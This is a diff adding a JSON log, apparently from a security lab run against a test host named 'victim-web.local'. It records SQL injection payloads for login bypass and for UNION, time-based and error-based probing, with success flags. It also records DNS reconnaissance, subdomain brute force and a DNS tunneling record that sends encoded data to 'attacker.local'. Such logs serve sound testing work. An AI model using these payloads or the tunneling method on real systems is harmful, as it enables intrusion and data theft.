@@ -1,0 +1,161 @@
+{
+  "custom_tests": {
+    "login_injections": [
+      {
+        "payload": "admin' --",
+        "status_code": 200,
+        "response_length": 2328,
+        "response_time": 0.009010553359985352,
+        "timestamp": "2025-07-24T01:57:21.553173",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "admin' OR '1'='1",
+        "status_code": 200,
+        "response_length": 2335,
+        "response_time": 0.030030250549316406,
+        "timestamp": "2025-07-24T01:57:22.959206",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' OR 1=1--",
+        "status_code": 200,
+        "response_length": 2329,
+        "response_time": 0.037543535232543945,
+        "timestamp": "2025-07-24T01:57:25.657685",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3--",
+        "status_code": 200,
+        "response_length": 2442,
+        "response_time": 0.01133871078491211,
+        "timestamp": "2025-07-24T01:57:27.565303",
+        "sql_error": true,
+        "success": false
+      },
+      {
+        "payload": "admin'/*",
+        "status_code": 200,
+        "response_length": 2327,
+        "response_time": 0.01006770133972168,
+        "timestamp": "2025-07-24T01:57:28.740209",
+        "sql_error": false,
+        "success": true
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "status_code": 200,
+        "response_length": 2325,
+        "response_time": 0.0032317638397216797,
+        "timestamp": "2025-07-24T01:57:31.704500",
+        "sql_error": false,
+        "success": false
+      }
+    ],
+    "search_injections": [
+      {
+        "payload": "' OR 1=1--",
+        "status_code": 200,
+        "response_length": 5367,
+        "response_time": 0.023181676864624023,
+        "timestamp": "2025-07-24T01:57:34.272094",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4,5--",
+        "status_code": 200,
+        "response_length": 1932,
+        "response_time": 0.003530740737915039,
+        "timestamp": "2025-07-24T01:57:37.194434",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users)>0--",
+        "status_code": 200,
+        "response_length": 5429,
+        "response_time": 0.009019136428833008,
+        "timestamp": "2025-07-24T01:57:39.572571",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND (SELECT SLEEP(3))--",
+        "status_code": 200,
+        "response_length": 1930,
+        "response_time": 0.003879070281982422,
+        "timestamp": "2025-07-24T01:57:40.627481",
+        "sql_error": false,
+        "time_based": false
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "status_code": 200,
+        "response_length": 1998,
+        "response_time": 0.010817289352416992,
+        "timestamp": "2025-07-24T01:57:42.316907",
+        "sql_error": false,
+        "time_based": false
+      }
+    ],
+    "union_injections": [],
+    "time_based_injections": []
+  },
+  "dns_attacks": {
+    "dns_reconnaissance": {
+      "target_domain": "victim-web.local",
+      "discovered_subdomains": [
+        {
+          "subdomain": "www.victim-web.local",
+          "ip": "172.16.0.10",
+          "record_type": "A",
+          "timestamp": 1753322340.3954058
+        },
+        {
+          "subdomain": "api.victim-web.local",
+          "ip": "172.16.0.11",
+          "record_type": "A",
+          "timestamp": 1753322340.3954537
+        }
+      ],
+      "domain_records": {
+        "A": [
+          "172.16.0.10"
+        ],
+        "NS": [
+          "ns1.local"
+        ],
+        "MX": [
+          "mail.local"
+        ]
+      },
+      "zone_transfer_success": false,
+      "timestamp": 1753322340.3954563
+    },
+    "dns_brute_force": {
+      "target_domain": "victim-web.local",
+      "attempts": 50,
+      "intensity": "medium",
+      "discovered": [],
+      "timestamp": 1753322343.915644
+    },
+    "dns_tunneling": {
+      "original_payload": "test data",
+      "total_chunks": 1,
+      "tunnel_queries": [
+        {
+          "query": "dGVzdCBkYXRh.attacker.local",
+          "response": "tunnel_response_0_1753322346",
+          "chunk_id": 0,
+          "timestamp": 1753322346.298755
+        }
+      ],
+      "timestamp": 1753322346.400013
+    }
+  }
+}
